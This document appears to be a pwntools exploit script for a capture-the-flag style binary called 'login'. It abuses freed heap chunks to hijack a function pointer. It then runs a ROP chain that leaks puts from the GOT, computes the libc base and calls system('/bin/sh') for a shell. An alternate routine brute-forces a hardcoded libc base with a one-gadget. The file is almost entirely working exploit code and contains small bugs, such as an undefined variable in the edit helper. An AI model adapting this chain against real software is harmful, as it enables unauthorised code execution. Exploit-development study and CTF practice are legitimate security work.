#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './login'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('Choice:\n', str(ch))

def add(id, size, content):
	menu(2)
	p.sendlineafter('id:\n', str(id))
	p.sendlineafter('length:\n',str(size))
	p.sendafter('password:\n', content)
	print "add a user success"

def login(id, size, content):
	menu(1)
	p.sendlineafter('id:\n', str(id))
	p.sendlineafter('length:\n',str(size))
	p.sendafter('password:\n', content)
	print "login a chunk success"


def edit(id, content):
	menu(4)
	p.sendlineafter('id:\n', str(id))
	p.sendlineafter('pass:\n', content)
	print "add a chunk success"

	print "edit %d chunk success" % idx

def free(id):
	menu(3)
	p.sendlineafter('id:\n', str(id))
	print "delete user %d success " % id

def exploit_force():
	add(0, 0x28, 'tree')
	add(1, 0x28, 'back')
	#gdb.attach(p, 'b* 0x400E04')
	free(0)
	free(1)
	#dbg()
	libc_base = 0x7f7a3f22e000
	onegadget = libc_base + 0xf1147
	puts_addr = libc_base + 0x6f690
	puts_got = 0x601FA8

	add(2, 0x18, p64(puts_got) + p64(onegadget))
	login(1, 0x18, p64(puts_addr))

	ret = p.recvline()
	if "success!" in ret:
		print "right!"
		p.interactive()
	else:
		p.close()


def exploit_rop():
	add(0, 0x88, 'tree')
	add(1, 0x88, 'back')
	add(2, 0x88, 'aaaa')

	free(0)
	free(1)
	puts_str = 0x400452
	pop_4_ret = 0x400F2C
	pop_rdi = 0x0000000000400f33
	puts_got = 0x601FA8
	puts_plt = 0x4006B8
	ret = 0x400C13

	payload = 'puts\x00\x00\x00\x00' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret)

	gdb.attach(p, 'b* 0x400E04')
	dbg()

	add(3, 0x18, p64(puts_str) + p64(pop_4_ret))
	login(1, len(payload), payload)

	p.recvline()
	puts_addr = u64(p.recvline().strip('\n').ljust(8, '\x00'))
	libc.address = puts_addr - libc.symbols['puts']
	system_addr = libc.symbols['system']
	binsh = next(libc.search('/bin/sh\x00'))
	print "system ==> " + hex(system_addr)
	print "binsh ==> " + hex(binsh)

	payload = 'puts\x00\x00\x00\x00' + p64(pop_rdi) + p64(binsh) + p64(system_addr) + p64(ret)
	login(1, len(payload), payload)
	p.interactive()

if __name__ == '__main__':
	
	p = process('./login')
	exploit_rop()
	
	'''
	while 1:
		p = process('./login')
		exploit_force()
	'''